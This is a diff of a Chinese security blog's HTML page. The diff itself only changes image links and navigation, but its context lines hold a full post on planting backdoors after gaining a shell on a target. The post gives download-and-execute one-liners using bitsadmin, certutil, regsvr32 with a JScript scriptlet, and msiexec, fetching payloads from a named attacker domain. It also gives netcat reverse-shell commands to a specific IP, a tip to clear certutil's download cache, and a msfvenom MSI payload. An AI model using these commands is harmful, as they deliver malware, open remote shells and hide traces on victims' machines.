@@ -23,20 +23,20 @@
 <meta property="og:site_name" content="Ninja&#39;s blog">
 <meta property="og:description" content="0x01 序拿到目标shell以后怎么上后门？可以使用下面几种文件下载执行的姿势。 0x02 CobaltStrike 命令上线使用CobaltStrike生成powershell payload  0x03 bitsadminbitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。 注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。 1bitsadmin &#x2F;t">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/cs.gif">
-<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/image-1719815226535-1.png">
-<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/bitsadmin.gif">
-<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/bitsadmin-nc.gif">
-<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/certutil.gif">
-<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/nc.gif">
-<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/image-1-1719815236749-7.png">
-<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/msiexec-calc.gif">
+<meta property="og:image" content="http://example.com/images/cs.gif">
+<meta property="og:image" content="http://example.com/images/image-1719815226535-1.png">
+<meta property="og:image" content="http://example.com/images/bitsadmin.gif">
+<meta property="og:image" content="http://example.com/images/bitsadmin-nc.gif">
+<meta property="og:image" content="http://example.com/images/certutil.gif">
+<meta property="og:image" content="http://example.com/images/nc.gif">
+<meta property="og:image" content="http://example.com/images/image-1-1719815236749-7.png">
+<meta property="og:image" content="http://example.com/images/msiexec-calc.gif">
 <meta property="article:published_time" content="2022-07-21T07:05:25.000Z">
-<meta property="article:modified_time" content="2024-07-01T08:42:01.334Z">
+<meta property="article:modified_time" content="2024-07-01T06:29:11.914Z">
 <meta property="article:author" content="Ninja">
 <meta property="article:tag" content="上马">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/cs.gif">
+<meta name="twitter:image" content="http://example.com/images/cs.gif">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -306,36 +306,36 @@
                 
                 <h4 id="0x01-序"><a href="#0x01-序" class="headerlink" title="0x01 序"></a>0x01 序</h4><p>拿到目标shell以后怎么上后门？可以使用下面几种文件下载执行的姿势。</p>
 <h4 id="0x02-CobaltStrike-命令上线"><a href="#0x02-CobaltStrike-命令上线" class="headerlink" title="0x02 CobaltStrike 命令上线"></a>0x02 CobaltStrike 命令上线</h4><p>使用CobaltStrike生成powershell payload</p>
-<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/cs.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/./images/cs.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h4 id="0x03-bitsadmin"><a href="#0x03-bitsadmin" class="headerlink" title="0x03 bitsadmin"></a>0x03 bitsadmin</h4><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
 <p>注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">bitsadmin /transfer n http://xx.imortal.icu/artifact.<span class="hljs-keyword">exe</span> C:\<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span> &amp; start C:\<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/image-1719815226535-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/bitsadmin.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/./images/image-1719815226535-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/./images/bitsadmin.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>使用nc反弹shell</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">bitsadmin /transfer n http://xx.imortal.icu/nc.<span class="hljs-keyword">exe</span> C:\nc.<span class="hljs-keyword">exe</span> &amp; start C:\nc.<span class="hljs-keyword">exe</span> -t -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">121.4</span>.<span class="hljs-number">69.24</span> <span class="hljs-number">6667</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/bitsadmin-nc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/./images/bitsadmin-nc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h4 id="0x04-certutil"><a href="#0x04-certutil" class="headerlink" title="0x04 certutil"></a>0x04 certutil</h4><p>certutil工具用于备份证书服务，xp-win10都支持。certutil下载文件会留下缓存，建议下载文件后对缓存进行删除。</p>
 <p>注：缓存位置</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content<br>certutil -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://xx.imortal.icu/artifact.<span class="hljs-keyword">exe</span> <span class="hljs-number">7</span><span class="hljs-keyword">z</span>.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-number">7</span><span class="hljs-keyword">z</span>.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/certutil.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/./images/certutil.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>注：certutil可以使用普通用户下运行，cs获得的权限根据命令用户的权限，普通用户不带红色闪电，使用管理员运行会带红色闪电</p>
 <p>当然也可以使用nc反弹shell</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://xx.imortal.icu/nc.<span class="hljs-keyword">exe</span> nc.<span class="hljs-keyword">exe</span> &amp; start nc.<span class="hljs-keyword">exe</span> -t -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">121.4</span>.<span class="hljs-number">69.24</span> <span class="hljs-number">6667</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/nc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/./images/nc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h4 id="0x05-regsvr32"><a href="#0x05-regsvr32" class="headerlink" title="0x05 regsvr32"></a>0x05 regsvr32</h4><p>regsvr32命令用于注册COM组件，是Windows系统提供用来向系统注册控件或者卸载控件的命令。我们可以通过构造.sct文件，去下载执行我们的后门程序。</p>
 <h6 id="构造-sct文件执行命令"><a href="#构造-sct文件执行命令" class="headerlink" title="构造.sct文件执行命令"></a>构造.sct文件执行命令</h6><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">registration</span>    <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;ShortJSRAT&quot;</span>    <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> &gt;</span>    </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml">        </span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml">&lt;![CDATA[            </span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml">ps  = &quot;cmd.exe /c calc.exe&quot;;            </span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml">new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);        </span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml">]]&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span></span><br><span class="language-xml">regsvr32.exe /u /n /s /i:http://xx.imortal.icu/calc.sct scrobj.dll</span><br></code></pre></td></tr></table></figure>
 
 <h4 id="0x06-msiexec"><a href="#0x06-msiexec" class="headerlink" title="0x06 msiexec"></a>0x06 msiexec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用msf生成msi文件，上传到vps</span><br>msfvenom -p windows/exec CMD=<span class="hljs-string">&#x27;calc.exe&#x27;</span> -f msi &gt; calc.msi<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/image-1-1719815236749-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/./images/image-1-1719815236749-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q /i http://tools.imortal.icu/calc.msi<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/msiexec-calc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/./images/msiexec-calc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
 
                 
               </div>
@@ -383,9 +383,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/01/09/dirsearch%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" title="dirsearch使用方法">
+                      <a href="/2022/07/21/Python%E7%BC%96%E5%86%99%E7%9A%84%E7%99%BE%E5%BA%A6URL%E9%87%87%E9%9B%86%E5%B7%A5%E5%85%B7/" title="Python编写的百度URL采集工具">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">dirsearch使用方法</span>
+                        <span class="hidden-mobile">Python编写的百度URL采集工具</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -393,8 +393,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/07/21/Python%E7%BC%96%E5%86%99%E7%9A%84%E7%99%BE%E5%BA%A6URL%E9%87%87%E9%9B%86%E5%B7%A5%E5%85%B7/" title="Python编写的百度URL采集工具">
-                        <span class="hidden-mobile">Python编写的百度URL采集工具</span>
+                      <a href="/2022/04/07/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/" title="sqlmap使用方法">
+                        <span class="hidden-mobile">sqlmap使用方法</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
